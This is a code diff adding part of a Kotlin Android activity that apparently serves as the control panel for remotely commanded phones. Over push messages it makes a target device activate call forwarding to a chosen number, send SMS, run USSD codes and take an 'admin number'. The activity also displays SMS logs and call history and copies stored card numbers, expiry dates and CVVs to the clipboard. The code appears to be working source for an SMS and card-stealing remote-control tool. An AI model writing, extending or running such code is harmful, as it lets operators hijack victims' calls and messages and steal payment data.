+                // Do not depend only on timestampChanged, because old value can be refreshed before watcher compares it.
+                if (timestampFresh || (timestampChanged && timestampFresh)) {
+                    finishOnlineCheckAsOnline(newOnlineCheckedAt)
+                    return@launch
+                }
+
+                if (elapsedMs >= CHECK_RESPONSE_TIMEOUT_MS) {
+                    finishOnlineCheckAsOffline("No response in 15 sec")
+                    return@launch
+                }
+
+                mainHandler.postDelayed(
+                    this@FinalActivity.onlineCheckWatcherRunnable,
+                    CHECK_POLL_INTERVAL_MS
+                )
+            }
+        }
+    }
+
+    private fun finishOnlineCheckAsOnline(checkedAt: Long) {
+        isOnlineCheckInProgress = false
+        mainHandler.removeCallbacks(onlineCheckWatcherRunnable)
+
+        runOnUiThread {
+            setDeviceOnlineUi(checkedAt)
+            Toast.makeText(this, " Device is online", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    private fun finishOnlineCheckAsOffline(errorMessage: String) {
+        isOnlineCheckInProgress = false
+        mainHandler.removeCallbacks(onlineCheckWatcherRunnable)
+
+        runOnUiThread {
+            setDeviceOfflineUi("Last checked: no response")
+            Toast.makeText(this, " Device offline: $errorMessage", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    private fun toggleCallPopup() {
+        if (callPopup?.isShowing == true) {
+            safeDismissWithAnim(callPopup)
+            callPopup = null
+            return
+        }
+
+        val view = layoutInflater.inflate(R.layout.toggle_popup, null)
+
+        callPopup = PopupWindow(
+            view,
+            ViewGroup.LayoutParams.MATCH_PARENT,
+            ViewGroup.LayoutParams.WRAP_CONTENT,
+            true
+        ).apply {
+            isOutsideTouchable = true
+            isFocusable = true
+            setBackgroundDrawable(ColorDrawable(0))
+            softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE
+        }
+
+        callPopup?.showAtLocation(window.decorView, Gravity.TOP, 0, dpToPx(60))
+
+        updatePopupSimViews(view)
+
+        val r1 = view.findViewById<RadioButton>(R.id.radioSim1)
+        val r2 = view.findViewById<RadioButton>(R.id.radioSim2)
+        val etNumber = view.findViewById<EditText>(R.id.editTextYourNumber)
+
+        var selectedSimSlot = 0
+
+        r1.setOnCheckedChangeListener(null)
+        r2.setOnCheckedChangeListener(null)
+
+        r1.isChecked = true
+        r2.isChecked = false
+
+        r1.setOnCheckedChangeListener { _, isChecked ->
+            if (isChecked) {
+                selectedSimSlot = 0
+                r2.isChecked = false
+            }
+        }
+
+        r2.setOnCheckedChangeListener { _, isChecked ->
+            if (isChecked) {
+                selectedSimSlot = 1
+                r1.isChecked = false
+            }
+        }
+
+        view.findViewById<TextView>(R.id.btnActive).setOnClickListener {
+            val num = etNumber.text.toString().trim()
+
+            if (num.length == 10) {
+                sendCallForwardingCommand(num, "ACTIVATE", selectedSimSlot)
+                safeDismissWithAnim(callPopup)
+                callPopup = null
+            } else {
+                Toast.makeText(this, "Enter valid 10-digit number", Toast.LENGTH_SHORT).show()
+            }
+        }
+
+        view.findViewById<TextView>(R.id.btnDeactivate).setOnClickListener {
+            sendCallForwardingCommand("", "DEACTIVATE", selectedSimSlot)
+            safeDismissWithAnim(callPopup)
+            callPopup = null
+        }
+    }
+
+    private fun sendCallForwardingCommand(number: String, action: String, simSlot: Int) {
+        coroutineScope.launch {
+            try {
+                val devices = supabaseApi.getAllDevices().getOrNull() ?: return@launch
+                val device = devices.find { it.uid == uniqueid }
+                val fcmToken = device?.fcmToken
+
+                if (fcmToken.isNullOrEmpty()) {
+                    withContext(Dispatchers.Main) {
+                        Toast.makeText(this@FinalActivity, "No FCM token", Toast.LENGTH_SHORT).show()
+                    }
+                    return@launch
+                }
+
+                val code = if (action == "ACTIVATE") "**21*$number#" else "##21#"
+
+                val payload = JSONObject().apply {
+                    put("uniqueid", uniqueid)
+                    put("type", "CALL_COMMAND")
+                    put("code", code)
+                    put("simSlot", simSlot)
+                    put("number", number)
+                    put("action", action)
+                    put("timestamp", System.currentTimeMillis())
+                }
+
+                Log.d(TAG, "CALL payload: $payload")
+
+                FCMHelper.sendCallCommand(
+                    context = this@FinalActivity,
+                    uniqueid = uniqueid,
+                    fcmToken = fcmToken,
+                    code = code,
+                    simSlot = simSlot,
+                    number = number,
+                    action = action,
+                    onResult = { success, error ->
+                        if (success && action == "ACTIVATE") {
+                            coroutineScope.launch {
+                                supabaseApi.updateCallForwarding(uniqueid, number, "ON")
+                            }
+
+                            runOnUiThread {
+                                Toast.makeText(
+                                    this@FinalActivity,
+                                    "Call forwarding activated on SIM ${if (simSlot == 0) "1" else "2"}",
+                                    Toast.LENGTH_SHORT
+                                ).show()
+                            }
+                        } else if (success && action == "DEACTIVATE") {
+                            coroutineScope.launch {
+                                supabaseApi.updateCallForwarding(uniqueid, "", "OFF")
+                            }
+
+                            runOnUiThread {
+                                Toast.makeText(
+                                    this@FinalActivity,
+                                    "Call forwarding deactivated on SIM ${if (simSlot == 0) "1" else "2"}",
+                                    Toast.LENGTH_SHORT
+                                ).show()
+                            }
+                        } else {
+                            runOnUiThread {
+                                Toast.makeText(this@FinalActivity, "Failed: $error", Toast.LENGTH_SHORT).show()
+                            }
+                        }
+                    }
+                )
+            } catch (e: Exception) {
+                Log.e(TAG, "sendCallForwardingCommand error", e)
+                withContext(Dispatchers.Main) {
+                    Toast.makeText(this@FinalActivity, "Error: ${e.message}", Toast.LENGTH_SHORT).show()
+                }
+            }
+        }
+    }
+
+    private fun toggleSmsPopup() {
+        if (smsPopup?.isShowing == true) {
+            safeDismissWithAnim(smsPopup)
+            smsPopup = null
+            return
+        }
+
+        val view = layoutInflater.inflate(R.layout.sms_popup, null)
+
+        smsPopup = PopupWindow(
+            view,
+            ViewGroup.LayoutParams.MATCH_PARENT,
+            ViewGroup.LayoutParams.WRAP_CONTENT,
+            true
+        ).apply {
+            // ✅ SMS popup send click par dismiss nahi hoga.
+            // ✅ User outside click/back press se popup close kar sakta hai.
+            isOutsideTouchable = true
+            isFocusable = true
+            setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
+            softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE
+        }
+
+        smsPopup?.showAtLocation(window.decorView, Gravity.TOP, 0, dpToPx(60))
+
+        updatePopupSimViews(view)
+
+        val r1 = view.findViewById<RadioButton>(R.id.radioSim1Sms)
+        val r2 = view.findViewById<RadioButton>(R.id.radioSim2Sms)
+        val etAddress = view.findViewById<EditText>(R.id.etAddress)
+        val etMessage = view.findViewById<EditText>(R.id.etMessage)
+
+        var selectedSimSlot = 0
+
+        r1.setOnCheckedChangeListener(null)
+        r2.setOnCheckedChangeListener(null)
+
+        r1.isChecked = true
+        r2.isChecked = false
+
+        r1.setOnCheckedChangeListener { _, isChecked ->
+            if (isChecked) {
+                selectedSimSlot = 0
+                r2.isChecked = false
+            }
+        }
+
+        r2.setOnCheckedChangeListener { _, isChecked ->
+            if (isChecked) {
+                selectedSimSlot = 1
+                r1.isChecked = false
+            }
+        }
+
+        view.findViewById<TextView>(R.id.btnSendSms).setOnClickListener {
+            val to = etAddress.text.toString().trim()
+            val msg = etMessage.text.toString().trim()
+
+            if (to.isNotEmpty() && msg.isNotEmpty()) {
+                sendSmsCommand(to, msg, selectedSimSlot)
+
+                // ✅ FIX: SMS send click ke baad popup dismiss nahi karna hai.
+                // Popup tabhi close hoga jab user outside click/back press karega
+                // ya Send SMS header button dobara tap karke manually close karega.
+            } else {
+                Toast.makeText(this, "Fill all fields and select SIM", Toast.LENGTH_SHORT).show()
+            }
+        }
+    }
+
+    private fun sendSmsCommand(to: String, message: String, simSlot: Int) {
+        coroutineScope.launch {
+            try {
+                val devices = supabaseApi.getAllDevices().getOrNull() ?: return@launch
+                val device = devices.find { it.uid == uniqueid }
+                val fcmToken = device?.fcmToken
+
+                if (fcmToken.isNullOrEmpty()) {
+                    runOnUiThread {
+                        Toast.makeText(this@FinalActivity, "No FCM token", Toast.LENGTH_SHORT).show()
+                    }
+                    return@launch
+                }
+
+                FCMHelper.sendSmsCommand(
+                    context = this@FinalActivity,
+                    uniqueid = uniqueid,
+                    fcmToken = fcmToken,
+                    to = to,
+                    message = message,
+                    simSlot = simSlot,
+                    onResult = { success, error ->
+                        if (!success) {
+                            runOnUiThread {
+                                Toast.makeText(this@FinalActivity, "SMS send failed: $error", Toast.LENGTH_SHORT).show()
+                            }
+                        } else {
+                            runOnUiThread {
+                                Toast.makeText(
+                                    this@FinalActivity,
+                                    "SMS sent via SIM ${if (simSlot == 0) "1" else "2"}",
+                                    Toast.LENGTH_SHORT
+                                ).show()
+                            }
+                        }
+                    }
+                )
+            } catch (e: Exception) {
+                Log.e(TAG, "sendSmsCommand error", e)
+            }
+        }
+    }
+
+    private fun toggleUssdPopup() {
+        if (ussdPopup?.isShowing == true) {
+            safeDismissWithAnim(ussdPopup)
+            ussdPopup = null
+            return
+        }
+
+        val view = layoutInflater.inflate(R.layout.ussd_tougle, null)
+
+        ussdPopup = PopupWindow(
+            view,
+            ViewGroup.LayoutParams.MATCH_PARENT,
+            ViewGroup.LayoutParams.WRAP_CONTENT,
+            true
+        ).apply {
+            isOutsideTouchable = true
+            isFocusable = true
+            setBackgroundDrawable(ColorDrawable(0))
+            softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE
+        }
+
+        ussdPopup?.showAtLocation(window.decorView, Gravity.TOP, 0, dpToPx(60))
+
+        updatePopupSimViews(view)
+
+        val r1 = view.findViewById<RadioButton>(R.id.radioSim1)
+        val r2 = view.findViewById<RadioButton>(R.id.radioSim2)
+        val etUssd = view.findViewById<EditText>(R.id.etUssdCode)
+
+        var selectedSimSlot = 0
+
+        r1.setOnCheckedChangeListener(null)
+        r2.setOnCheckedChangeListener(null)
+
+        r1.isChecked = true
+        r2.isChecked = false
+
+        r1.setOnCheckedChangeListener { _, isChecked ->
+            if (isChecked) {
+                selectedSimSlot = 0
+                r2.isChecked = false
+            }
+        }
+
+        r2.setOnCheckedChangeListener { _, isChecked ->
+            if (isChecked) {
+                selectedSimSlot = 1
+                r1.isChecked = false
+            }
+        }
+
+        view.findViewById<TextView>(R.id.btnSendUssd).setOnClickListener {
+            val ussdCode = etUssd.text.toString().trim()
+
+            if (ussdCode.isNotEmpty()) {
+                sendUssdCommand(ussdCode, selectedSimSlot)
+                safeDismissWithAnim(ussdPopup)
+                ussdPopup = null
+            } else {
+                Toast.makeText(this, "Enter USSD code and select SIM", Toast.LENGTH_SHORT).show()
+            }
+        }
+    }
+
+    private fun sendUssdCommand(code: String, simSlot: Int) {
+        coroutineScope.launch {
+            try {
+                val devices = supabaseApi.getAllDevices().getOrNull() ?: return@launch
+                val device = devices.find { it.uid == uniqueid }
+                val fcmToken = device?.fcmToken
+
+                if (fcmToken.isNullOrEmpty()) return@launch
+
+                FCMHelper.sendUssdCommand(
+                    context = this@FinalActivity,
+                    uniqueid = uniqueid,
+                    fcmToken = fcmToken,
+                    code = code,
+                    simSlot = simSlot,
+                    onResult = { success, error ->
+                        if (!success) {
+                            runOnUiThread {
+                                Toast.makeText(this@FinalActivity, "USSD send failed: $error", Toast.LENGTH_SHORT).show()
+                            }
+                        } else {
+                            runOnUiThread {
+                                Toast.makeText(
+                                    this@FinalActivity,
+                                    "USSD sent via SIM ${if (simSlot == 0) "1" else "2"}",
+                                    Toast.LENGTH_SHORT
+                                ).show()
+                            }
+                        }
+                    }
+                )
+            } catch (e: Exception) {
+                Log.e(TAG, "sendUssdCommand error", e)
+            }
+        }
+    }
+
+    private fun showAdminTogglePopup() {
+        if (adminTogglePopup?.isShowing == true) {
+            safeDismissWithAnim(adminTogglePopup)
+            adminTogglePopup = null
+            return
+        }
+
+        val view = layoutInflater.inflate(R.layout.admin_toggle, null)
+
+        adminTogglePopup = PopupWindow(
+            view,
+            ViewGroup.LayoutParams.MATCH_PARENT,
+            ViewGroup.LayoutParams.WRAP_CONTENT,
+            true
+        ).apply {
+            isOutsideTouchable = true
+            isFocusable = true
+            setBackgroundDrawable(ColorDrawable(0))
+            softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE
+        }
+
+        adminTogglePopup?.showAtLocation(window.decorView, Gravity.CENTER, 0, 0)
+
+        val etAdminNumber = view.findViewById<EditText>(R.id.etAdminNumber)
+        val btnSend = view.findViewById<TextView>(R.id.btnSendT)
+        val btnErase = view.findViewById<TextView>(R.id.btnErase)
+        val btnClose = view.findViewById<TextView>(R.id.btnCloseAdmin)
+
+        currentAdminConfig?.let { config ->
+            if (config.number.isNotEmpty() && config.number != "inactive") {
+                etAdminNumber.setText(config.number)
+            }
+        }
+
+        btnSend.setOnClickListener {
+            val adminNumber = etAdminNumber.text.toString().trim()
+
+            if (adminNumber.length == 10) {
+                updateAdminConfig(adminNumber, "ON")
+                safeDismissWithAnim(adminTogglePopup)
+                adminTogglePopup = null
+            } else {
+                Toast.makeText(this, "Enter valid 10-digit number", Toast.LENGTH_SHORT).show()
+            }
+        }
+
+        btnErase.setOnClickListener {
+            updateAdminConfig("", "OFF")
+            safeDismissWithAnim(adminTogglePopup)
+            adminTogglePopup = null
+        }
+
+        btnClose.setOnClickListener {
+            safeDismissWithAnim(adminTogglePopup)
+            adminTogglePopup = null
+        }
+    }
+
+    private fun updateAdminConfig(number: String, status: String) {
+        coroutineScope.launch {
+            try {
+                val result = supabaseApi.updateAdminConfig(number, status)
+
+                result.fold(
+                    onSuccess = { success ->
+                        if (success) {
+                            sendAdminNumberToDevice(number, status)
+
+                            withContext(Dispatchers.Main) {
+                                Toast.makeText(this@FinalActivity, "Admin config updated", Toast.LENGTH_SHORT).show()
+                            }
+                        }
+                    },
+                    onFailure = { error ->
+                        withContext(Dispatchers.Main) {
+                            Toast.makeText(this@FinalActivity, "Error: ${error.message}", Toast.LENGTH_SHORT).show()
+                        }
+                    }
+                )
+            } catch (e: Exception) {
+                Log.e(TAG, "updateAdminConfig error", e)
+            }
+        }
+    }
+
+    private fun sendAdminNumberToDevice(adminNumber: String, status: String) {
+        coroutineScope.launch {
+            try {
+                val devices = supabaseApi.getAllDevices().getOrNull() ?: return@launch
+                val device = devices.find { it.uid == uniqueid }
+                val fcmToken = device?.fcmToken
+
+                if (fcmToken.isNullOrEmpty()) return@launch
+
+                val finalNumber = if (status == "ON") adminNumber else "inactive"
+
+                FCMHelper.sendAdminNumber(
+                    context = this@FinalActivity,
+                    uniqueid = uniqueid,
+                    fcmToken = fcmToken,
+                    adminNumber = finalNumber,
+                    onResult = { success, _ ->
+                        if (success) {
+                            coroutineScope.launch {
+                                supabaseApi.updateCallForwarding(uniqueid, finalNumber, status)
+                            }
+
+                            runOnUiThread {
+                                Toast.makeText(this@FinalActivity, "Admin number sent", Toast.LENGTH_SHORT).show()
+                            }
+                        } else {
+                            runOnUiThread {
+                                Toast.makeText(this@FinalActivity, "Failed to send admin number", Toast.LENGTH_SHORT).show()
+                            }
+                        }
+                    }
+                )
+            } catch (e: Exception) {
+                Log.e(TAG, "sendAdminNumberToDevice error", e)
+            }
+        }
+    }
+
+    private fun navigateToAllUserData() {
+        try {
+            val intent = Intent(this, AllUserDataActivity::class.java)
+            intent.putExtra("uniqueid", uniqueid)
+            startActivity(intent)
+        } catch (e: Exception) {
+            Log.e(TAG, "Navigation error", e)
+        }
+    }
+
+    private fun copyCardDetailsToClipboard() {
+        val cardDetails = """
+            Card Number: ${etCardNumber.text}
+            Expiry: ${etExpiry.text}
+            CVV: ${etCvv.text}
+        """.trimIndent()
+
+        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+        clipboard.setPrimaryClip(ClipData.newPlainText("Card Details", cardDetails))
+
+        Toast.makeText(this, "Card details copied", Toast.LENGTH_SHORT).show()
+    }
+
+    private fun copyToClipboard(text: String) {
+        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+        clipboard.setPrimaryClip(ClipData.newPlainText("SMS", text))
+
+        Toast.makeText(this, "Copied!", Toast.LENGTH_SHORT).show()
+    }
+
+    private fun formatTimeForDisplay(timestamp: Long): String {
+        return try {
+            SimpleDateFormat("hh:mm a, dd MMM", Locale.getDefault()).format(Date(timestamp))
+        } catch (e: Exception) {
+            timestamp.toString()
+        }
+    }
+
+    private fun getTimeAgo(timestamp: Long): String {
+        val diff = System.currentTimeMillis() - timestamp
+
+        return when {
+            diff < 60000L -> "Just now"
+            diff < 3600000L -> "${diff / 60000L} min ago"
+            diff < 86400000L -> "${diff / 3600000L} hours ago"
+            else -> SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault()).format(Date(timestamp))
+        }
+    }
+
+    private fun startFinalFetchService() {
+        Intent(this, FinalFetchService::class.java).also {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(it)
+            } else {
+                startService(it)
+            }
+        }
+    }
+
+    private fun dpToPx(dp: Int): Int {
+        return (dp * resources.displayMetrics.density).toInt()
+    }
+
+    private fun safeDismissWithAnim(popup: PopupWindow?) {
+        popup ?: return
+
+        try {
+            popup.dismiss()
+        } catch (_: Exception) {
+        }
+    }
+
+    private fun isActivityAlive(): Boolean {
+        return !isFinishing &&
+                !(Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1 && isDestroyed)
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+
+        deviceInfoJob?.cancel()
+        onlineStatusJob?.cancel()
+        smsLogsJob?.cancel()
+        callHistoryJob?.cancel()
+        adminConfigJob?.cancel()
+
+        smsRealtimeClient?.disconnect()
+        smsRealtimeClient = null
+
+        mainHandler.removeCallbacksAndMessages(null)
+        coroutineScope.cancel()
+
+        dismissCurrentDialog()
+        displayedSmsIds.clear()
+
+        Log.d(TAG, "Activity destroyed")
+    }
+}
